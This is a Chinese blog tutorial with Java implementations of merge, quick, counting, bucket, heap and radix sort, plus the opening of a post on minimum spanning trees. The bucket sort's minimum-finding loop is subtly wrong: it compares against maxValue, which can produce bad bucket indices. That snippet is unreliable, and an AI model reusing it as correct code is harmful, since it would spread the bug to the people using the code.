<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143303.gif" alt="  "><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143306.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Merge</span> &#123;</span><br><span class="line">	<span class="comment">// 归并所需要的辅助数组</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Comparable[] assistTemp;</span><br><span class="line">    </span><br><span class="line">	 <span class="comment">/*</span></span><br><span class="line"><span class="comment">    对数组 args 中的元素进行排序</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mergeSort</span><span class="params">(Comparable[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化辅助数组 assistTemp</span></span><br><span class="line">        assistTemp = <span class="keyword">new</span> <span class="title class_">Comparable</span>[args.length];</span><br><span class="line">        mergeSort(args, <span class="number">0</span>, args.length - <span class="number">1</span>, assistTemp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">mergeSort</span><span class="params">(Comparable[] args, <span class="type">int</span> left, <span class="type">int</span> right, Comparable[] assistTemp)</span> &#123;</span><br><span class="line">        <span class="comment">// 分解</span></span><br><span class="line">        <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right) / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">// 向左递归进行分解</span></span><br><span class="line">            mergeSort(args, left, mid, assistTemp);</span><br><span class="line">            <span class="comment">// 向右递归进行分解</span></span><br><span class="line">            mergeSort(args, mid + <span class="number">1</span>, right, assistTemp);</span><br><span class="line">            <span class="comment">// 每分解一次便合并一次</span></span><br><span class="line">            merge(args, left, right, mid, assistTemp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     合并</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(Comparable[] args, <span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> mid, Comparable[] assistTemp)</span> &#123;</span><br><span class="line">        <span class="comment">// 用于合并数组的下标，即操作 assistTemp 下标</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">tempIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left, j = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt;= mid &amp;&amp; j &lt;= right)&#123;</span><br><span class="line">            <span class="comment">// 当 args[i] &lt;= args[j] 时，将 args[i] 加入 assistTemp</span></span><br><span class="line">            <span class="keyword">if</span>(greater(args[j], args[i]))&#123;</span><br><span class="line">                assistTemp[tempIndex ++] = args[i ++];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                assistTemp[tempIndex ++] = args[j ++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将未遍历完的数组直接放入 assistTemp</span></span><br><span class="line">        <span class="keyword">while</span>(i &lt;= mid)&#123;</span><br><span class="line">            assistTemp[tempIndex ++] = args[i ++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(j &lt;= right)&#123;</span><br><span class="line">            assistTemp[tempIndex ++] = args[j ++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将 assistTemp 的元素赋值给 args</span></span><br><span class="line">        <span class="keyword">for</span>(i = right; i &gt;= left; --i)&#123;</span><br><span class="line">            args[i] = assistTemp[--tempIndex];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        比较 v元素 是否大于 w元素 </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="type">boolean</span> <span class="title function_">greater</span><span class="params">(Comparable v, Comparable w)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> v.compareTo(w) &gt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="六、快速排序"><a href="#六、快速排序" class="headerlink" title="六、快速排序"></a>六、快速排序</h1><p>快速排序是对冒泡排序的一种改进。它的基本思想是：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。</p>
<blockquote>
<p><strong>排序原理：</strong></p>
<ol>
<li>首先设定一个分界值，通过该分界值将数组分成左右两部分；</li>
<li>将大于或等于分界值的数据放到到数组右边，小于分界值的数据放到数组的左边。此时左边部分中各元素都小于或等于分界值，而右边部分中各元素都大于或等于分界值；</li>
<li>然后，左边和右边的数据可以独立排序。对于左侧的数组数据，又可以取一个分界值，将该部分数据分成左右两部分，同样在左边放置较小值，右边放置较大值。右侧的数组数据也可以做类似处理</li>
<li>重复上述过程，可以看出，这是一个递归定义。通过递归将左侧部分排好序后，再递归排好右侧部分的顺序。当<br>左侧和右侧两个部分的数据排完序后，整个数组的排序也就完成了。</li>
</ol>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143311.gif" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Quick</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    比较v元素是否大于等于w元素</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="type">boolean</span> <span class="title function_">greater</span><span class="params">(Comparable v, Comparable w)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> v.compareTo(w) &gt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	数组元素i和j交换位置</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exch</span><span class="params">(Comparable[] args, <span class="type">int</span> i,<span class="type">int</span> j)</span>&#123;</span><br><span class="line">		Comparable temp;</span><br><span class="line">		temp = args[i];</span><br><span class="line">		args[i] = args[j];</span><br><span class="line">		args[j] = temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对数组内的元素进行排序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(Comparable[] args)</span> &#123;</span><br><span class="line">        quickSort(args, <span class="number">0</span>, args.length - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(Comparable[] args, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="comment">// 安全性校验</span></span><br><span class="line">        <span class="keyword">if</span> (right &lt; left)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 取第一个数为基准值</span></span><br><span class="line">        <span class="type">Comparable</span> <span class="variable">key</span> <span class="operator">=</span> args[left];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left, j = right;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j)&#123;</span><br><span class="line">            <span class="comment">// 先从右往左扫描，找到一个比基准值小的元素</span></span><br><span class="line">            <span class="keyword">while</span> (greater(args[j], key) &amp;&amp; j &gt; i)</span><br><span class="line">                j --;</span><br><span class="line">            <span class="comment">// 再从左往右扫描，找一个比基准值大的元素</span></span><br><span class="line">            <span class="keyword">while</span> (greater(key, args[i]) &amp;&amp; i &lt; j)</span><br><span class="line">                i ++;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; j)</span><br><span class="line">                exch(args, i, j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 交换基准值与i、j相遇位置的元素</span></span><br><span class="line">        exch(args, left, i);</span><br><span class="line">        <span class="comment">// 对分成的左边部分进行排序</span></span><br><span class="line">        quickSort(args, left, i - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 对分成的右边部分进行排序</span></span><br><span class="line">        quickSort(args, i + <span class="number">1</span>, right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>快速排序和归并排序的区别：</strong><br>快速排序是另外一种分治的排序算法，它将一个数组分成两个子数组，将两部分独立的排序。快速排序和归并排序是互补的：归并排序将数组分成两个子数组分别排序，并将有序的子数组归并从而将整个数组排序，而快速排序的方式则是当两个数组都有序时，整个数组自然就有序了。在归并排序中，一个数组被等分为两半，归并调用发生在<br>处理整个数组之前，在快速排序中，切分数组的位置取决于数组的内容，递归调用发生在处理整个数组之后。</p>
</blockquote>
<hr>
<h1 id="七、计数排序"><a href="#七、计数排序" class="headerlink" title="七、计数排序"></a>七、计数排序</h1><p>计数排序是一个基于非比较的排序算法，元素从未排序状态变成已排序状态的过程，是由额外空间的计数和元素本身的值决定的。</p>
<blockquote>
<p> <strong>排序步骤：</strong></p>
<ol>
<li>找出待排序的数组array中最大的元素max</li>
<li>统计数组中每个值为 i 的元素出现的次数，存入数组 count 的第 i 项</li>
<li>对所有的计数累加（从 count中的第一个元素开始，每一项和前一项相加）</li>
<li>反向填充目标数组：将每个元素 i 放在新数组的第 count [i] 项，每放一个元素就将 count [i] 减去</li>
</ol>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143314.gif" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Count</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">countSort</span><span class="params">(Comparable[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取最大值，以便确定 countArray 大小</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">countLen</span> <span class="operator">=</span>(<span class="type">int</span>) findMaxElement(args) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span>[] countArray = <span class="keyword">new</span> <span class="title class_">int</span>[countLen];</span><br><span class="line">        <span class="comment">// 开始计数</span></span><br><span class="line">        <span class="keyword">for</span> (Comparable t: args)</span><br><span class="line">            countArray[(<span class="type">int</span>) t] ++;</span><br><span class="line">        <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; countLen; ++i)&#123;</span><br><span class="line">            <span class="keyword">while</span> (countArray[i] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                args[idx ++] = i;</span><br><span class="line">                countArray[i] --;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	比较v元素是否大于w元素</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span>  <span class="type">boolean</span> <span class="title function_">greater</span><span class="params">(Comparable v, Comparable w)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> v.compareTo(w) &gt; <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	返回数组最大值</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Comparable <span class="title function_">findMaxElement</span><span class="params">(Comparable[] args)</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (args.length == <span class="number">0</span>)   <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">		<span class="type">Comparable</span> <span class="variable">max</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">for</span> (Comparable t: args)&#123;</span><br><span class="line">			<span class="keyword">if</span> (greater(t, max))</span><br><span class="line">				max = t;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> max;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="八、桶排序"><a href="#八、桶排序" class="headerlink" title="八、桶排序"></a>八、桶排序</h1><p>桶排序可以看成是计数排序的升级版，它将要排的数据分到多个有序的桶里，每个桶里的数据再单独排序，再把每个桶的数据依次取出，即可完成排序。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143318.gif" alt="  "></p>
<blockquote>
<p> <strong>排序步骤：</strong></p>
<ol>
<li>确定桶的大小与个数，一般根据要排序的元素的值域区间取定。</li>
<li>设计一种方式使元素能映射至对应值域的桶的索引。</li>
<li>遍历所有元素，将它们入桶。</li>
<li>每个桶内元素排序。</li>
<li>从桶内依次提取各元素重新排列。</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Bucket</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bucketSort</span><span class="params">(Integer[] args)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (args.length == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">minValue</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">maxValue</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// 找到最值便于确定桶的数量</span></span><br><span class="line">        <span class="keyword">for</span> (Integer t: args)&#123;</span><br><span class="line">            <span class="keyword">if</span> (t &lt; maxValue)</span><br><span class="line">                minValue = t;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (t &gt; maxValue)</span><br><span class="line">                maxValue = t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 根据最值与数组长度确定桶的数量</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">bucketNum</span> <span class="operator">=</span> (maxValue - minValue) / args.length + <span class="number">1</span>;</span><br><span class="line">        ArrayList&lt;ArrayList&lt;Integer&gt;&gt; buckets = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(bucketNum);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bucketNum; ++i)</span><br><span class="line">            buckets.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;());</span><br><span class="line">        <span class="comment">// 元素入桶</span></span><br><span class="line">        <span class="keyword">for</span> (Integer t: args)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">bucketIdx</span> <span class="operator">=</span> (t - minValue) / args.length;</span><br><span class="line">            buckets.get(bucketIdx).add(t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 桶内元素排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bucketNum; ++i)</span><br><span class="line">            Collections.sort(buckets.get(i));</span><br><span class="line">        <span class="comment">// 从各个桶内去除元素重新拼接为数组</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (ArrayList&lt;Integer&gt; bucket: buckets)&#123;</span><br><span class="line">            <span class="keyword">for</span> (Integer t: bucket)</span><br><span class="line">                args[idx ++] = t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="九、堆排序"><a href="#九、堆排序" class="headerlink" title="九、堆排序"></a>九、堆排序</h1><blockquote>
<p><strong>排序思想：</strong></p>
<ol>
<li><p>首先将待排序的数组构造成一个大根堆，此时，整个数组的最大值就是堆结构的顶端</p>
</li>
<li><p>将顶端的数与末尾的数交换，此时，末尾的数为最大值，剩余待排序数组个数为n-1</p>
</li>
<li><p>将剩余的n-1个数再构造成大根堆，再将顶端数与n-1位置的数交换，如此反复执行，便能得到有序数组</p>
</li>
</ol>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143322.gif" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Heap</span> &#123;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">    堆排序</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">heapSort</span><span class="params">(Integer[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> args.length;</span><br><span class="line">        <span class="comment">// 从最后一个不是叶子结点的节点开始调整</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> len / <span class="number">2</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i --)&#123;</span><br><span class="line">            heapify(args, i, len);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> len - <span class="number">1</span>; i &gt; <span class="number">0</span>; i --)&#123;</span><br><span class="line">            <span class="comment">// 关键字移</span></span><br><span class="line">            exch(args, <span class="number">0</span>, i);</span><br><span class="line">            heapify(args, <span class="number">0</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    调整为大根堆</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">(Integer[] args, <span class="type">int</span> cur, <span class="type">int</span> len)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> <span class="number">2</span> * cur + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(child &lt; len)&#123;</span><br><span class="line">            <span class="keyword">if</span>(child + <span class="number">1</span> &lt; len)&#123;</span><br><span class="line">                <span class="keyword">if</span>(args[child + <span class="number">1</span>] &gt; args[child])</span><br><span class="line">                    child += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(args[cur] &gt; args[child])</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            exch(args, cur, child);</span><br><span class="line">            cur = child;</span><br><span class="line">            child = <span class="number">2</span> * cur + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    数组元素i和j交换位置</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exch</span><span class="params">(Integer[] a, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">t</span> <span class="operator">=</span> a[i];</span><br><span class="line">        a[i] = a[j];</span><br><span class="line">        a[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<h1 id="十、基数排序"><a href="#十、基数排序" class="headerlink" title="十、基数排序"></a>十、基数排序</h1><p>基数排序是一种非比较算法，其原理是将整数按每个位数分别比较。他利用了桶的思想。</p>
<blockquote>
<p><strong>案例：</strong><br>给定一个数组 <code>arr = [321，1，10，60，577，743，127]</code></p>
<p>① 准备十个桶：0 ~ 9<br>② 第一轮按照元素的个位数排序 0~9的各个桶内分别存放数组中各元素的个位数，按照数组元素的顺序依次存放<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143324.png" alt="  "><br>再按照桶的顺序取出数据并放回原数组，<code>arr = [10，60，321，1，743，577，127]</code></p>
<hr>
<p>③  第二轮按照元素的十位数排序 0~9的各个桶内分别存放数组中各元素的十位数，按照数组元素的顺序依次存放<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143326.png" alt="  ">再按照桶的顺序取出数据并放回原数组，<code>arr = [1，10，321，127，743，60，577]</code></p>
<hr>
<p>④ 第三轮按照元素的百位数排序 0~9的各个桶内分别存放数组中各元素的百位数，按照数组元素的顺序依次存放<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143329.png" alt="  ">再按照桶的顺序取出数据并放回原数组，<code>arr = [1，10，60，127，321，577，743]</code></p>
<hr>
<p>到这里，针对于以上数组的基数排序就结束了</p>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815143331.gif" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Radix</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">radixSort</span><span class="params">(Integer[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 得到数组中最大的数的位数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">maxNum</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (args[i] &gt; maxNum) &#123;</span><br><span class="line">                maxNum = args[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 得到最大数是几位数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">maxLength</span> <span class="operator">=</span> (maxNum + <span class="string">&quot;&quot;</span>).length();</span><br><span class="line">        <span class="comment">// 定义一个二维数组，表示10个桶, 每个桶就是一个一维数组</span></span><br><span class="line">        <span class="comment">// 为了防止放入数据的时候桶溢出，我们应该尽量将桶的容量设置得大一些</span></span><br><span class="line">        <span class="type">int</span>[][] buckets = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>][args.length];</span><br><span class="line">        <span class="comment">// 记录每个桶存放元素个数</span></span><br><span class="line">        <span class="type">int</span>[] bucketElementCounts  = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="comment">/* n *= 10 的原因是</span></span><br><span class="line"><span class="comment">        123取出个位数字是 123 % 10，即 123 / 1 % 10;</span></span><br><span class="line"><span class="comment">        123 取出十位数字是123 / 10 % 10;</span></span><br><span class="line"><span class="comment">        123 去除百位数字是123 / 100 % 10;</span></span><br><span class="line"><span class="comment">        以此类推</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, n = <span class="number">1</span>; i &lt; maxLength; i++, n *= <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; args.length; j++) &#123;</span><br><span class="line">                <span class="comment">// 取出每个元素的对应位的值</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">bit</span> <span class="operator">=</span> args[j] / n % <span class="number">10</span>;</span><br><span class="line">                <span class="comment">// 放入到对应的桶中</span></span><br><span class="line">                buckets[bit][bucketElementCounts[bit]] = args[j];</span><br><span class="line">                <span class="comment">// 该桶对应元素数量 + 1</span></span><br><span class="line">                bucketElementCounts[bit]++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 按照桶的顺序取出数据并放回原数组</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 遍历每一桶，并将桶中是数据，放入到原数组</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; bucketElementCounts.length; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (bucketElementCounts[k] != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>; l &lt; bucketElementCounts[k]; l++) &#123;</span><br><span class="line">                        args[index++] = buckets[k][l];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 放回原数组后，需要将每个 everyBucketNum[k] = 0</span></span><br><span class="line">                bucketElementCounts[k] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>数据结构</tag>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>最小生成树-Prim + Kruskal算法</title>
    <url>/posts/9acb5cb3.html</url>
    <content><![CDATA[<h1 id="一、-最小生成树定义及相关约定"><a href="#一、-最小生成树定义及相关约定" class="headerlink" title="一、 最小生成树定义及相关约定"></a>一、 最小生成树定义及相关约定</h1><p>在加权图中，它的边关联了一个权重，那么我们就可以根据这个权重解决最小成本问题，但如何才能找到最小成本对应的顶点和边呢？最小生成树相关算法可以解决。</p>
<h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h2><p>图的生成树是它的一棵含有其所有顶点的无环连通子图，一副加权无向图的最小生成树它的一棵权值(树中所有边的权重之和)最小的生成树</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140722.png" alt=" "></p>
<h2 id="2-约定"><a href="#2-约定" class="headerlink" title="2. 约定"></a>2. 约定</h2><p>只考虑连通图。最小生成树的定义说明它只能存在于连通图中，如果图不是连通的，那么分别计算每个连通图子图的最小生成树，合并到一起称为最小生成森林。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140731.png"></p>
<hr>
<h1 id="二、最小生成树原理"><a href="#二、最小生成树原理" class="headerlink" title="二、最小生成树原理"></a>二、最小生成树原理</h1><h2 id="1-数的性质"><a href="#1-数的性质" class="headerlink" title="1. 数的性质"></a>1. 数的性质</h2><ol>
<li>用一条边接树中的任意两个顶点都会产生一个新的环</li>
</ol>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140803.png" alt="  "></p>
<ol start="2">
<li>从树中删除任意一条边，将会得到两棵独立的树</li>
</ol>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140806.png" alt="  "></p>
<h2 id="2-切分定理"><a href="#2-切分定理" class="headerlink" title="2. 切分定理"></a>2. 切分定理</h2><p>要从一副连通图中找出该图的最小生成树，需要通过切分定理完成。<br><strong>切分</strong><br>将图的所有顶点按照某些规则分为两个非空且没有交集的集合。<br><strong>横切边</strong><br>连接两个属于不同集合的顶点的边称之为横切边。<br>例如我们将图中的顶点切分为两个集合，灰色顶点属于一个集合，白色顶点属于另外一个集合，那么效果如下：</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140810.png" alt="  "></p>
<p><strong>切分定理</strong><br>在一副加权图中，给定任意的切分，它的横切边中的权重最小者必然属于图中的最小生成树。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815140812.png" alt="  "></p>
<p><strong>注意</strong>:一次切分产生的多个横切边中，权重最小的边不一定是所有横切边中唯一属于图的最小生成树的边。</p>
<h2 id="3-贪心算法"><a href="#3-贪心算法" class="headerlink" title="3. 贪心算法"></a>3. 贪心算法</h2><p>贪心算法是计算图的最小生成树的基础算法，它的基本原理就是切分定理，使用<strong>切分定理找到最小生成树的一条边，不断的重复直到找到最小生成树的所有边</strong>。如果图有<code>V</code>个顶点，那么需要找到<code>V - 1</code>条边，就可以表示该图的最小生成树。</p>
